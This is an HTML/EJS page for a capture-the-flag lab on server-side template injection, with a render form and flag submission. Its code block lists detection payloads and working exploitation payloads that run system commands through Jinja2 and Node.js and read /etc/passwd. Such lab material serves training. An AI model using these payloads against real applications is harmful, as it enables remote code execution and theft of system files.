<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/ssti"><i class="fas fa-flask"></i> SSTI Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🧪 Basic SSTI</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span><span class="lab-tag points"><i class="fas fa-star"></i> 35 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>Your input is rendered by a template engine. Inject template expressions to achieve code execution.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Template Renderer</h2>
      <div class="vulnerable-form">
        <label>Template input (user-controlled):</label>
        <input type="text" id="sstiInput" placeholder="{{7*7}}" autocomplete="off">
        <button onclick="renderTemplate()" class="btn">Render</button>
      </div>
      <div id="sstiResult" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">Detection payloads:
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (Freemarker/EL)
#{7*7} → 49 (Ruby ERB)

Exploitation (Jinja2):
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}

Node.js/EJS:
process.mainModule.require('child_process').execSync('whoami')</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('ssti-basic','flagInput_ssti','flagResult_ssti'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ssti" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_ssti" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function renderTemplate() {
      const res = await fetch('/labs/ssti/basic/render', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({template:document.getElementById('sstiInput').value}) });
      document.getElementById('sstiResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
